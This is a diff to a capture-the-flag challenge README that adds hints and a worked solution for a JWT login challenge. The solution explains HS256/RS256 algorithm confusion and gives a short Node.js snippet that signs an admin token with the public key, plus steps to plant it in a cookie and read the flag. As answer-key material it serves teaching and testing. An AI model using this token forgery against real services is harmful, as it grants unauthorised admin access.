@@ -16,9 +16,9 @@ Webex
 
 ## Hints
 * What's [RFC 7519](https://tools.ietf.org/html/rfc7519)?
-* [Another helpful website](https://jwt.io)
-* What are some common vulnerabilities with JWT libraries?
+* What are some common vulnerabilities with JWT implementations?
 * You need to some sort of key to make tokens...
+* Consider using a programming library, such as [node-jsonwebtoken](https://www.npmjs.com/package/jsonwebtoken), to help you.
 
 ## Downloads
 * `server/enterpriseloginsigning.key.pub` (as-is, without a trailing newline)
@@ -32,7 +32,20 @@ Deploy the contents of `server/` with an up-to-date version of Node.js. Pass in 
 * `LOGIN4_PORT` - desired port to listen to
 
 ## Solution
-TBD.
+A typical HS256/RS256 JWT confusion problem, in which a known asymmetric key can be used as a symmetric secret.
+
+1. `npm install jsonwebtoken`
+2. Run with Node.js:
+    ```javascript
+    const { sign } = require("jsonwebtoken");
+    const { readFileSync } = require("fs");
+
+    console.log(sign({
+        isAdmin: true
+    }, readFileSync("enterpriseloginsigning.key.pub", "utf8"), {expiresIn: 3600}));
+    ```
+3. Paste output into the `login4_token` cookie.
+4. Browse to `/flag` and get flag.
 
 ## Author
 Anthony Li
